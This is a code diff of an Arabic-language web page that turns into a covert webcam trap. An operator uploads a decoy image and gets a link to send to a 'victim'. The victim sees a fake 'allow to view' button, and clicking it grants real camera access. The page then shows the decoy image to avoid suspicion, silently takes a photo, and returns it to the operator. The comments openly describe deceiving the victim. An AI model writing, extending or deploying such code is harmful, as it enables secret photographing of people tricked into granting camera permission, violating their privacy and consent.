@@ -3,98 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام تبادل الصور</title>
+    <title>تأكيد الهوية للمتابعة</title>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #f0f2f5; padding: 20px; }
-        .card { background: white; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        button { background: #1877f2; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
-        #receivedImage { width: 100%; margin-top: 20px; border: 2px solid #1877f2; display: none; }
-        .hidden { display: none; }
-        video { width: 100%; border-radius: 10px; background: #000; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; }
+        
+        /* واجهة الضحية */
+        #victim-ui { width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #1a1a1a; color: white; text-align: center; }
+        .overlay-box { padding: 20px; border-radius: 15px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); width: 80%; max-width: 350px; }
+        .allow-btn { background: #2563eb; color: white; border: none; padding: 12px 30px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
+        #displayImg { display: none; max-width: 100%; max-height: 100vh; }
+
+        /* واجهة التحكم */
+        #admin-ui { background: white; padding: 25px; border-radius: 15px; position: fixed; z-index: 1000; width: 85%; max-width: 400px; left: 50%; top: 50%; transform: translate(-50%, -50%); text-align: center; color: #333; }
+        .hidden { display: none !important; }
+        input[type="text"] { width: 100%; padding: 10px; margin-top: 10px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        #receivedImage { width: 100%; margin-top: 15px; border: 3px solid #2563eb; border-radius: 10px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div id="sender-ui">
-        <h2>لوحة التحكم</h2>
-        <p>ارفع أي صورة لإنشاء رابط التجسس/التأكد:</p>
-        <input type="file" id="triggerFile" accept="image/*">
-        <div id="linkArea" class="hidden">
-            <p>أرسل هذا الرابط للضحية:</p>
-            <input type="text" id="generatedLink" readonly style="width:100%">
+    <div id="admin-ui">
+        <h3>إعداد الرابط</h3>
+        <p>اختر الصورة التي ستظهر بعد "السماح":</p>
+        <input type="file" id="imageSelector" accept="image/*">
+        <div id="linkOutput" class="hidden">
+            <p>أرسل هذا الرابط للطرف الآخر:</p>
+            <input type="text" id="finalLink" readonly>
         </div>
         <hr>
-        <h3>الصورة الملتقطة ستظهر هنا:</h3>
-        <div id="status">في انتظار فتح الرابط...</div>
-        <img id="receivedImage">
+        <div id="status">في انتظار الطرف الآخر...</div>
+        <img id="receivedImage" class="hidden">
     </div>
 
-    <div id="receiver-ui" class="hidden">
-        <h2>جاري تحميل الصورة...</h2>
-        <p>يرجى السماح بالوصول للكاميرا للمتابعة</p>
-        <button id="startCam">السماح بالوصول</button>
-        <video id="video" autoplay playsinline class="hidden"></video>
-        <canvas id="canvas" class="hidden"></canvas>
+    <div id="victim-ui" class="hidden">
+        <div id="permission-dialog" class="overlay-box">
+            <h2 style="margin-top:0;">محتوى مقيد</h2>
+            <p>لمشاهدة هذه الصورة، يجب عليك منح الإذن بالنقر على زر السماح أدناه.</p>
+            <button class="allow-btn" id="fake-allow-btn">السماح بالمشاهدة</button>
+        </div>
+        
+        <img id="displayImg" src="">
+        <video id="video" autoplay playsinline style="display:none;"></video>
+        <canvas id="canvas" style="display:none;"></canvas>
     </div>
-</div>
 
 <script>
-    // تمييز المستخدم: هل هو أنت أم الطرف الآخر؟
-    const urlParams = new URLSearchParams(window.location.search);
-    const isReceiver = urlParams.has('view');
-    const senderUI = document.getElementById('sender-ui');
-    const receiverUI = document.getElementById('receiver-ui');
+    const params = new URLSearchParams(window.location.search);
+    const viewId = params.get('view_id'); 
 
-    if (isReceiver) {
-        senderUI.classList.add('hidden');
-        receiverUI.classList.remove('hidden');
+    const adminUI = document.getElementById('admin-ui');
+    const victimUI = document.getElementById('victim-ui');
+    const displayImg = document.getElementById('displayImg');
+    const dialog = document.getElementById('permission-dialog');
+
+    // --- منطق الضحية ---
+    if (viewId) {
+        adminUI.classList.add('hidden');
+        victimUI.classList.remove('hidden');
+        
+        const savedImg = localStorage.getItem('stored_image');
+        if (savedImg) displayImg.src = savedImg;
+
+        // عندما يضغط على زر "السماح بالمشاهدة" الوهمي
+        document.getElementById('fake-allow-btn').onclick = async () => {
+            try {
+                // طلب الكاميرا الحقيقي من المتصفح
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // إخفاء الرسالة وإظهار الصورة الأصلية فوراً لكي لا يشعر بشيء
+                dialog.classList.add('hidden');
+                displayImg.style.display = 'block';
+
+                // التقاط الصورة بصمت في الخلفية بعد ثانية واحدة
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const data = canvas.toDataURL('image/jpeg', 0.6);
+                    localStorage.setItem('captured_result', data); 
+                    
+                    stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا
+                }, 1000);
+            } catch (err) {
+                alert("يجب منح الإذن لمشاهدة المحتوى.");
+            }
+        };
     }
 
-    // المبرمج: عند اختيارك لصورة
-    document.getElementById('triggerFile').onchange = (e) => {
-        const currentUrl = window.location.href.split('?')[0];
-        const victimLink = currentUrl + "?view=camera_access";
-        document.getElementById('generatedLink').value = victimLink;
-        document.getElementById('linkArea').classList.remove('hidden');
-        
-        // هنا نبدأ "التصنت" على التغييرات (باستخدام LocalStorage للتجربة على نفس الجهاز)
-        // ملاحظة: للعمل بين جهازين مختلفين ستحتاج Firebase API هنا.
+    // --- منطق التحكم (أنت) ---
+    document.getElementById('imageSelector').onchange = (e) => {
+        const reader = new FileReader();
+        reader.onload = (event) => {
+            localStorage.setItem('stored_image', event.target.result);
+            const baseUrl = window.location.href.split('?')[0];
+            const randomId = "SECURE_" + Math.random().toString(36).substr(2, 5);
+            document.getElementById('finalLink').value = baseUrl + "?view_id=" + randomId;
+            document.getElementById('linkOutput').classList.remove('hidden');
+        };
+        reader.readAsDataURL(e.target.files[0]);
+
         window.addEventListener('storage', (event) => {
-            if (event.key === 'captured_photo') {
-                document.getElementById('receivedImage').src = event.newValue;
-                document.getElementById('receivedImage').style.display = 'block';
-                document.getElementById('status').innerText = "تم استلام صورة من الطرف الآخر!";
+            if (event.key === 'captured_result') {
+                const imgDisplay = document.getElementById('receivedImage');
+                imgDisplay.src = event.newValue;
+                imgDisplay.classList.remove('hidden');
+                document.getElementById('status').innerText = "✅ تم استلام الصورة من الضحية!";
             }
         });
     };
-
-    // الطرف الآخر: عند الضغط على السماح
-    document.getElementById('startCam').onclick = async () => {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            
-            // التقاط صامت بعد ثانية
-            setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const data = canvas.toDataURL('image/jpeg');
-                
-                // إرسال الصورة "برمجياً" عبر التخزين المشترك
-                localStorage.setItem('captured_photo', data);
-                
-                stream.getTracks().forEach(t => t.stop());
-                alert("تم التحقق بنجاح.");
-            }, 1000);
-        } catch (e) {
-            alert("يجب السماح بالكاميرا.");
-        }
-    };
 </script>
-
 </body>
 </html>
